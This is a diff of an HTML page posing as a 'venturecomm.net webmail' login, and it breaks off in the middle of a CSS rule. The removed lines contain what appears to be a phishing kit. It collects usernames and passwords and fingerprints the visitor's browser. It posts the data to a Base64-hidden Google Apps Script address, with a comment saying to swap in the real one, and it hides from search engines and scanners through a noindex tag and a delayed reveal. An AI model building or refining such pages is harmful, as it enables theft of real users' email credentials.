@@ -1,128 +1,36 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <title>Venture Webmail Login</title>
+  <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <meta name="robots" content="noindex,nofollow">
+  <title>venturecomm.net webmail</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
-      font-family: sans-serif;
-      background: white;
+      padding: 0;
+      font-family: Arial, sans-serif;
+      background-color: #fff;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
     }
 
     .container {
+      width: 100%;
       max-width: 400px;
-      margin: 100px auto;
+      padding: 20px;
       text-align: center;
-      display: none; /* Hide initially */
-    }
-
-    .logo {
-      margin-bottom: 30px;
     }
 
     .logo img {
-      width: 300px;
-      max-width: 90%;
+      max-width: 100%;
+      height: auto;
+      margin-bottom: 20px;
     }
 
-    .input-group {
-      display: flex;
-      align-items: center;
-      margin: 10px 20px;
-      border: 1px solid #ccc;
-      border-radius: 5px;
-      overflow: hidden;
-    }
-
-    .input-group i {
-      background: #f5f5f5;
-      padding: 12px;
-      border-right: 1px solid #ccc;
-    }
-
-    .input-group input {
-      flex: 1;
-      padding: 12px;
-      border: none;
-      outline: none;
-      font-size: 16px;
-    }
-
-    .login-button {
-      margin: 20px 20px 10px;
-      width: calc(100% - 40px);
-      padding: 14px;
-      background-color: #00bfff;
-      color: white;
-      font-size: 16px;
-      border: none;
-      border-radius: 5px;
-      cursor: pointer;
-    }
-
-    .footer {
-      font-size: 14px;
-      color: #666;
-      margin-top: 10px;
-    }
-  </style>
-</head>
-<body>
-
-  <div class="container">
-    <div class="logo">
-      <img src="https://i.ibb.co/j98nvG7w/IMG-8935.jpg" alt="Venture Communications Logo">
-    </div>
-
-    <form method="POST" id="secureForm">
-      <!-- Honeypot field -->
-      <div style="display:none;">
-        <input type="text" name="nickname" autocomplete="off">
-      </div>
-
-      <div class="input-group">
-        <i>👤</i>
-        <input type="text" name="username" placeholder="Username" required>
-      </div>
-
-      <div class="input-group">
-        <i>🔒</i>
-        <input type="password" name="password" placeholder="Password" required>
-      </div>
-
-      <!-- Fingerprint field -->
-      <input type="hidden" name="fingerprint" id="fingerprint">
-
-      <button class="login-button" type="submit">LOGIN</button>
-    </form>
-
-    <div class="footer">venturecomm.net webmail</div>
-  </div>
-
-  <!-- Load FingerprintJS -->
-  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-
-  <script>
-    // Obfuscated form action URL — REPLACE this with your real Base64-encoded Google Apps Script URL
-    const encodedUrl = "aHR0cHM6Ly9zY3JpcHQuZ29vZ2xlLmNvbS93ZWIvYXBwcy1leGFtcGxl";
-
-    // Set form action + reveal form after delay
-    window.onload = function () {
-      document.getElementById("secureForm").action = atob(encodedUrl);
-      setTimeout(() => {
-        document.querySelector('.container').style.display = 'block';
-      }, 500);
-    };
-
-    // Generate and insert fingerprint
-    const fpPromise = FingerprintJS.load();
-    fpPromise.then(fp => fp.get()).then(result => {
-      document.getElementById('fingerprint').value = result.visitorId;
-    });
-  </script>
-
-</body>
-</html>
+    form {
